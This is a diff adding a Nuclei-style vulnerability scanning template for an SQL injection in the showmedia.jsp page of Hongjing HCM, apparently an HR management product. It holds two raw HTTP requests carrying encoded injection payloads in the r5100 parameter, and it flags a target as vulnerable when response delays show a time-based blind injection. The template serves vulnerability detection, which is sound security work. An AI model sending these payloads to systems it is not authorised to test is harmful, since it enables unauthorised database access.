@@ -1,0 +1,32 @@
+id: hongjing-HCM-showmedia-sqli
+info:
+  name: 宏景HCM showmedia存在SQL注入漏洞
+  author: mhb17
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: sqli
+http:
+  - raw:
+      - |+
+        GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9dKDkcunkvVn HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64MHhzZWM=) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+      - |
+        GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9aiWqroDzoCf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64MHhzZWM=) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    req-condition: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - duration_1 >= 3
+          - duration_2 >= 5
